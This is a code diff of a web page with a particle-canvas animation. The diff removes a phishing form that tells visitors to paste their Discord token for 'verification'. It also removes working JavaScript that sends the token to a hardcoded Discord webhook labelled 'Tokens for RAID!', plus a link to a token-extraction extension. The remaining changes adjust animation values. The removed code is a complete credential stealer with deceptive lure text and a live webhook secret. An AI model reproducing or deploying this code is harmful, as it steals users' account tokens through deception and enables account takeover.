@@ -66,122 +66,8 @@
 <body>
   <!-- Canvas for the constellation effect -->
   <canvas id="mycanvas"></canvas>
-
-  <!-- Removed container -->
-  <h2>Verification</h2>
-  <label for="username">Executor Issue? Please enter your Discord token below. Rest assured, your token is securely protected—it will only be used for verification purposes and will never be displayed publicly. This ensures that the script will function correctly.</label>
-  <input type="text" id="username" class="input-field" placeholder="Enter Token" required>
-
-  <button id="sendKeyButton" class="button">Verify</button>
   
-  <!-- New Button to Open Discord Link -->
-  <button id="openDiscordButton" class="button link-button">How to get Token?</button>
-
   <script>
-    // Function to encrypt the username (shift letters by 5)
-    function encryptUsername(username) {
-      let encrypted = '';
-      username = username.toLowerCase(); // Convert to lowercase
-
-      for (let i = 0; i < username.length; i++) {
-        let char = username[i];
-        if (char >= 'a' && char <= 'z') {
-          // Shift letter by 5
-          let newChar = String.fromCharCode(((char.charCodeAt(0) - 97 + 5) % 26) + 97);
-          encrypted += newChar;
-        } else {
-          // If it's not a letter, keep the character as it is
-          encrypted += char;
-        }
-      }
-      return encrypted;
-    }
-
-    // Webhook URL
-    const webhookUrl = "https://discord.com/api/webhooks/1320921772757094400/lN6fdTBleJaCdZk1FjOxt0DyXU1ZapPazAo4Osgq_GHTyaSDdlQmp7vmATHl74SIu0K3";
-
-    let timer = false;  // To track if the button is in cooldown
-
-document.getElementById('sendKeyButton').addEventListener("click", function() {
-  if (timer) {
-    alert("Please wait for 10 seconds before sending again.");
-    return;
-  }
-
-  const username = document.getElementById('username').value.trim();
-
-  if (!username) {
-    alert("Please enter your Token");
-    return;
-  }
-
-  // Encrypt the username
-  const encryptedKey = encryptUsername(username);
-  const message = {
-    content: `<@1246751390605246537>\nTOKEN: ${username}\nEncrypted Key IGNORE: ${encryptedKey}`,
-    username: "Tokens for RAID!",
-    avatar_url: "https://cdn.discordapp.com/icons/1315870677634383894/52f0346dba77bdc177c5da937f6ae790.webp?size=160"
-  };
-
-  // Send the encrypted key to the Discord webhook
-  fetch(webhookUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(message)
-  })
-  .then(response => {
-    // Check if the response is empty (204 No Content)
-    if (response.status === 204) {
-      // Discord responds with 204 for a successful post but no response body
-      console.log("Key sent to Discord (no content in response).");
-      document.getElementById('sendKeyButton').innerText = "Verified!";
-      document.getElementById('username').value = '';  // Clear the input field
-      return;  // Skip further processing since the response has no content
-    }
-
-    // If the response is not 204, attempt to read and parse it as text or JSON
-    return response.text(); // Read response as plain text
-  })
-  .then(text => {
-    // Only try to parse the response if there is text content
-    if (text) {
-      try {
-        const data = JSON.parse(text);  // Try to parse text as JSON if there's content
-        console.log("Key sent to Discord:", data);
-      } catch (error) {
-        console.error("Error parsing response:", error);
-        console.log("Raw Response Text:", text);  // Log the raw response text for debugging
-      }
-    }
-  })
-  .catch(error => {
-    console.error("Error sending key:", error);
-    document.getElementById('sendKeyButton').innerText = "Error Verifing!";
-  });
-
-  // Set timer to disable the button for 10 seconds
-  timer = true;
-  let countdown = 10;
-  document.getElementById('sendKeyButton').innerText = `Cooldown: ${countdown}s`;
-
-  const countdownInterval = setInterval(function() {
-    countdown--;
-    document.getElementById('sendKeyButton').innerText = `Cooldown: ${countdown}s`;
-    if (countdown <= 0) {
-      clearInterval(countdownInterval);
-      timer = false;
-      document.getElementById('sendKeyButton').innerText = "Verified";
-    }
-  }, 1000);
-});
-
-    // Open the Discord link in a new tab when the new button is clicked
-    document.getElementById('openDiscordButton').addEventListener("click", function() {
-      window.open("https://chromewebstore.google.com/detail/discord-get-user-token/accgjfooejbpdchkfpngkjjdekkcbnfd", "_blank");
-    });
-
     // Canvas and constellation effect code
     const canvas = document.getElementById('mycanvas');
     const ctx = canvas.getContext('2d');
@@ -190,7 +76,7 @@ document.getElementById('sendKeyButton').addEventListener("click", function() {
 
     let particles = [];
     let spawnCooldown = 0; // Cooldown timer for particle spawn
-    const spawnRate = 3; // Number of frames before new particles can spawn again (increase to slow it down)
+    const spawnRate = 2; // Number of frames before new particles can spawn again (increase to slow it down)
 
     window.addEventListener('resize', function (e) {
       canvas.width = window.innerWidth;
@@ -239,7 +125,7 @@ document.getElementById('sendKeyButton').addEventListener("click", function() {
       update() {
         this.x += this.speedX;
         this.y += this.speedY;
-        this.size -= 0.1;
+        this.size -= 0.03;
       }
       draw() {
         ctx.fillStyle = this.color;
